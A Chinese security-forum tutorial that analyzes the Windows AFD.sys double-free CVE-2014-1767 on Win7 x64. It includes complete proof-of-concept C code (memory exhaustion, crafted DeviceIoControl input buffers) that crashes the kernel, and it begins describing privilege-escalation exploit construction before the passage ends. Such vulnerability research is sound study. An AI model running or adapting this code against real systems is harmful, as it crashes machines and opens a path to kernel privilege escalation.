
# [原创]【EXP 编写与分析系列四】Windows本地提权漏洞CVE-2014-1767分析及EXP编写指导

## 1、前言

### 1.1 为什么写这篇文章

这是我的第四篇CVE文章，相比前面三篇，我认为这篇文章研究的CVE漏洞，是最难，同时也是最值得学习的一个提权漏洞。尽管之前的漏洞也很优秀，但这个漏洞我认为是优秀者中的佼佼者。我们要自己去构造内存数据，而且要精确到字节，要了解一些系统的机制，还要知道各种函数的反汇编用法，因此EXP里面的每一个数据都有其特定的含义，并非随意而为，难度自然更大。我想这对提高我们的PWN水平有帮助，所以我写下了这篇文章。

本文侧重于介绍内存构造的思路，最后给出了调试结果。

### 1.2 概述

在2014年的Pwn2Own黑客大赛上，windows8.1平台上的IE11沙箱，被Siberas安全团队利用CVE-2014-1767 Windows `AFD.sys`双重释放漏洞绕过，他们也因此获得2014年黑客奥斯卡的“最佳提权漏洞奖”。

### 1.3 非常重要的说明

针对这个漏洞我要说明的有以下几点：

1. 本文侧重点在POC、EXP编写，从逆向与调试的角度引领你分析、编写POC、EXP；
2. 本文是首篇针对该漏洞在x64平台下的分析、编写文章；
3. 全网最详细POC、EXP的编写说明；
4. EXP完全复用POC的代码；
5. 上传的EXP是我自己编写的。

实验环境为：`win7_x64_sp1`（7601）版本

## 2、POC分析

### 2.1 POC代码

```
ULONG CalcLength()
{
int BaseLength = 0x10000;
unsigned __int16 VirtualAddress = 0x13371337;
int FinalLength = 0x0;
while (1)
{
FinalLength = ((BaseLength & 0xFFF) + ((unsigned __int16)VirtualAddress & 0xFFF) + 0xFFF) >> 0xC;
FinalLength = 8 * (FinalLength + (BaseLength>>0xC))+ 0x30;
if (FinalLength == 0x100)
{
break;
}
else
{
BaseLength += 1;
continue;
}
}
return BaseLength;
}
int main()
{
int nBottonRect = 0x2aaaaaa;
while (true)
{
HRGN hrgn = CreateRoundRectRgn(0, 0, 1, nBottonRect, 1, 1);
if (hrgn==NULL)
{
break;
}
printf("hrgn = %p\n", hrgn);
}
//这儿看IoAllocateMdl(ntoskrnl)
DWORD length = CalcLength();
printf("Length = %x\n", length);
DWORD virtualAddress = 0x13371337;
static BYTE inbuf1[0x40];
memset(inbuf1, 0, sizeof(inbuf1));
*(ULONG_PTR*)(inbuf1 + 0x20) = virtualAddress;
*(ULONG*)(inbuf1 + 0x28) = length;
*(ULONG*)(inbuf1 + 0x3c) = 1;
static BYTE inbuf2[0x18];
memset(inbuf2, 0, sizeof(inbuf2));
*(ULONG*)(inbuf2) = 1;
*(ULONG*)(inbuf2 + 0x8) = 0x0AAAAAAA;
WSADATA WSAData;
SOCKET s;
sockaddr_in sa;
int ierr;
WSAStartup(0x2, &WSAData);
s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
memset(&sa, 0, sizeof(sa));
sa.sin_port = htons(135);
sa.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
sa.sin_family = AF_INET;
ierr = connect(s, (const struct sockaddr*)&sa, sizeof(sa));
DeviceIoControl((HANDLE)s, 0x1207F, (LPVOID)inbuf1, 0x40, NULL, 0, NULL, NULL);
DeviceIoControl((HANDLE)s, 0x120C3, (LPVOID)inbuf2, 0x18, NULL, 0, NULL, NULL);
}
```

### 2.2 POC运行结果

![](upload/attach/202202/945611_6THHDY8F992FRMR.png)

运行上面POC代码，系统出现蓝屏后的windbg调试结果见上图（上图并不是原始输出，我把一些不重要的数据删除了）。从第一个红框可以看出：

1. 这是一个双重释放漏洞；
2. 双重释放的代码在`afd!AfdReturnTpinfo+0xe7`。

我们先来看看`afd!AfdReturnTpinfo+0xe7`，是什么代码：

![](upload/attach/202202/945611_Q65EYMF597Z6JSJ.png)

可见，在`afd!AfdReturnTpinfo+0xe1`处，是`IoFreeMdl`函数，它是用来释放`Mdl`指针的。那么，释放完之后，有没有对指针进行清零处理？我们来看看反编译代码：

![](upload/attach/202202/945611_7DFQ6XJDV7QFZDK.png)

根据上面分析可知，`IoFreeMdl`肯定被执行了两次，那么，在后面我们进行分析时，可以在此处下断点，看这块内存是怎么变化的。现在，我们来看看，程序为什么会调用`IoFreeMdl`两次。

### 2.3 漏洞产生的根本原因

漏洞是因为连续两次释放内存，由`afd!AfdReturnTpinfo`调用。

第一次是因为调用

`DeviceIoControl((HANDLE)s, 0x1207F, (LPVOID)inbuf1, 0x40, NULL, 0, NULL, NULL);`

时，`afd!afdTransmitFile+0x2CD`调用`MmProbeAndLockPages`函数判断的地址，是POC里面指定的`0x13371337`这个非法地址，所以会出现异常，如下图所示：

![](upload/attach/202202/945611_XXJX467KC5XQ8NQ.png)

![](upload/attach/202202/945611_W59KBZ4NSZE2DSB.png)

第二次调用：

`DeviceIoControl((HANDLE)s, 0x120C3, (LPVOID)inbuf2, 0x18, NULL, 0, NULL, NULL);`

因为POC里面指定的内存空间是`0x0AAAAAAA*0x18`，在`afd!afdTransmitPackets`中调用`afd!AfdTliGetTpInfo`，执行`ExAllocatePoolwithQutaTag`时失败后，会跳到`AfdReturnTpinfo`函数执行，如下图：

![](upload/attach/202202/945611_59CYRAXTP2WNWWA.png)

两次进入异常处理函数，都会调用`IoFreeMdl`函数，从而导致指针双重释放。

## 3、x64平台POC编写指导

### 3.1 第一阶段：消耗系统内存

```
int nBottonRect = 0x2aaaaaa;
while (true)
{
HRGN hrgn = CreateRoundRectRgn(0, 0, 1, nBottonRect, 1, 1);
if (hrgn==NULL)
{
break;
}
printf("hrgn = %p\n", hrgn);
}
```

通过`CreateRoundRectRgn`函数消耗内存。至于为什么要消耗内存，可以先看2.3节，我在后面会做更详细说明。

### 3.2 第二阶段：构造Inbuff1

#### 3.2.1 Inbuff1的输入长度构造

POC里面有个函数`CalcLength`，它是用于计算输入长度，用来控制分配内存空间大小的。现在，我们需要内存固定分配`0x100`字节大小的空间，至于为什么，我在后面说明，现在你只用知道，我们需要构造一个`0x100`大小的内存空间。

在`afd!AfdTransmitFile`中，`nt!IoAllocateMdl`函数第二个参数`length`就是我们输入的参数，通过这个参数，就可以控制内存大小，见下图：

![](upload/attach/202202/945611_82KTFBGF6C2R9HJ.png)

现在，我们需要看看`IoAllocateMdl`是如何分配内存空间的，反编译`nt!IoAllocateMdl`，可得：

![](upload/attach/202202/945611_HCW9TSHRCHWX2JD.png)

我们的`CalcLength`函数，就是为了输入`Length`，得到一个固定的内存`0x100`。基本思路是：

1. 初始`Length`从`0x10000`开始；
2. `ViRtualAddress`是非法地址`0x13371337`；

通过`while(1)`循环，查找使得分配内存为`0x100`的`length`，具体实现见代码。

代码实现为：

```
ULONG CalcLength()
{
int BaseLength = 0x10000;
unsigned __int16 VirtualAddress = 0x13371337;
int FinalLength = 0x0;
while (1)
{
FinalLength = ((BaseLength & 0xFFF) + ((unsigned __int16)VirtualAddress & 0xFFF) + 0xFFF) >> 0xC;
FinalLength = 8 * (FinalLength + (BaseLength>>0xC))+ 0x30;
if (FinalLength == 0x100)
{
break;
}
else
{
BaseLength += 1;
continue;
}
}
return BaseLength;
}
```

#### 3.2.2 Inbuff1的参数构造

`afd!afdTransmitFile`和`afd!afdTransmitPackets`两个函数的函数原型分别是：

```
__fastcall AfdTransmitFile(PIRP pIRP, PIO_STACK_LOCATION pIoStackLocation)
__fastcall AfdTransmitPackets(PIRP pIrp, PIO_STACK_LOCATION pIoStackLocation)
```

第二个形参的定义为：

```
kd> dt _io_stack_location
ntdll!_IO_STACK_LOCATION
+0x000 MajorFunction : UChar
+0x001 MinorFunction : UChar
+0x002 Flags : UChar
+0x003 Control : UChar
+0x008 Parameters : <unnamed-tag>
//struct{
// +0x008 ULONG OutputBufferLength;
// +0x010 POINTER_ALIGNMENT InputBufferLength;
// +0x018 POINTER_ALIGNMENT IoControlCode;
// +0x020 Type3InputBuffer
//}
+0x028 DeviceObject : Ptr64 _DEVICE_OBJECT
+0x030 FileObject : Ptr64 _FILE_OBJECT
+0x038 CompletionRoutine : Ptr64 long
+0x040 Context : Ptr64 Void
```

最重要的就是偏移`0x20`的`Type3InputBuffer`了，这就是我们传入的`inbuff1`数据。但有个问题，在我们调用这个函数之前，传入的`inbuff1`已经在栈里面了，现在参数的应用都类似这样：

`rsp+8c`、`rsp+78`、`rsp+70`等等，我们就无法知道这些参数在`inbuff1`的位置。

但幸好，我们可以根据`IoAlloctedMdll`函数，很方便的定位`length`和`VirtualAddress`。因为`IoAlloctedMdll`的第一个形参、第二个形参是分别是地址、长度，这是已知的，那么我们就可以先定位`length`，再定位其他参数。

反编译`afd!AfdTransmitFile`，分析后，如下图：

![](upload/attach/202202/945611_MVAFKFG4YXPTA2Z.png)

由上图可知：

1. 因为第`104`行的判断，所以`inbuff1`的长度至少为`0x40`；
2. 先让`inbuff1`有规律的等于一个值，输入之后，断点看`length`的数值，就可以知道`length`在`buff1`的位置，又知道`length`在`rsp+0x78`，现在`VirtualAddress`在`rsp+0x70`，那么，`length`偏移`0x28`，`VirtualAdress`就偏移`0x20`。
3. 第`112`行可知，`v8`由`v45`得来，`v45`在`rsp+8C`位置，也就是`inbuff1`的`0x3C`位置，`v8`等于`1`的时候，可以不进入第`112`行的`if`判断，从而执行正常流程。

所以有：

```
static BYTE inbuf1[0x40];
memset(inbuf1, 0, sizeof(inbuf1));
*(ULONG_PTR*)(inbuf1 + 0x20) = virtualAddress;
*(ULONG*)(inbuf1 + 0x28) = length;
*(ULONG*)(inbuf1 + 0x3c) = 1;
```

### 3.3 第三阶段：构造Inbuff2

`inbuff2`是通过`AfdTransmitPackets`函数处理的，所以反编译`AfdTransmitPackets`函数之后分析，如下图：

![](upload/attach/202202/945611_9J53VMEXX4ZXZ97.png)

从上图可知：

1. 第`103`行表明，输入的`inbuff2`长度至少为`0x18`字节，所以我们定义的就是`0x18`字节；
2. 由第`114`行可知，`v7`就是我们的`inbuff2`；
3. 由第`125`行可知，`inbuff2`的第`0`个字节等于`1`，就不会进入`if`；
4. 由第`136`行可知，输入的`v52`是分配系数，分配的大小是`0x18 * 输入长度`，现在分配的长度是`0x0AAAAAAA*0x18`字节，而我们在第一阶段就已经把内存消耗完，这里执行只会失败。

![](upload/attach/202202/945611_2JB87JEV2YXMS26.png)

综上所以，可得：

```
static BYTE inbuf2[0x18];
memset(inbuf2, 0, sizeof(inbuf2));
*(ULONG*)(inbuf2) = 1;
*(ULONG*)(inbuf2 + 0x8) = 0x0AAAAAAA;
```

### 3.4 触发漏洞

最后，触发漏洞函数为：

```
DeviceIoControl((HANDLE)s, 0x1207F, (LPVOID)inbuf1, 0x40, NULL, 0, NULL, NULL);
DeviceIoControl((HANDLE)s, 0x120C3, (LPVOID)inbuf2, 0x18, NULL, 0, NULL, NULL);
```

控制码为`0x1207F`的`DeviceIoControl`函数执行之后，会因为地址异常执行`nt!IoFreeMdl`，释放一次指针；控制码为`0x120C3`的`DeviceIoControl`函数执行之后，又会因为异常执行`nt!IoFreeMdl`，再释放一次指针，从而触发漏洞。

## 4、x64平台EXP编写指导

### 4.1 基本思路

调用控制码为`0x1207F`的函数触发异常释放`pool`后，创建一个对象占用这个释放的`pool`，然后再调用控制码为`0x120C3`的函数，触发异常后再次释放这个`pool`，最后再把这个`pool`的数据赋值成假数据，但指向这个`pool`的指针，我们已经能够控制了，具体分析如下。

### 4.1 第一步：构造`FakeWorkerFactory`

先来看看构造的代码：
